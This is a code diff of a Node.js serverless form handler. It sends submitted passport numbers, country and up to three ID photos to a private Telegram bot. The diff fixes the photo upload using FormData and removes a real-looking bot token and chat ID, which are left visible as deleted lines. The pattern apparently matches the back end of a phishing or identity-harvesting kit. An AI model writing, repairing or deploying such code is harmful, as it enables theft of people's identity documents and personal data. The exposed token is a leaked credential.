@@ -1,11 +1,12 @@
 const fetch = require("node-fetch");
+const FormData = require("form-data");
 
 exports.handler = async (event) => {
   try {
     const data = JSON.parse(event.body);
 
-    const BOT = "8301683186:AAFy4JNbZXrrOpFFrKmy4nhx0RpxeILvW8k";
-    const CHAT = "6718406269";
+    const BOT = "PUT_YOUR_BOT_TOKEN_HERE";
+    const CHAT = "PUT_YOUR_CHAT_ID_HERE";
 
     const text = `
 New User:
@@ -15,6 +16,7 @@ Passport: ${data.passport}
 Country: ${data.country}
 `;
 
+    // 🧾 send text
     await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -24,17 +26,23 @@ Country: ${data.country}
       })
     });
 
+    // 📸 send photos using FormData (FIXED)
     const photos = [data.photo1, data.photo2, data.photo3];
 
     for (let p of photos) {
       if (p) {
+        const form = new FormData();
+        const buffer = Buffer.from(p, "base64");
+
+        form.append("chat_id", CHAT);
+        form.append("photo", buffer, {
+          filename: "image.jpg",
+          contentType: "image/jpeg"
+        });
+
         await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: CHAT,
-            photo: `data:image/jpeg;base64,${p}`
-          })
+          body: form
         });
       }
     }
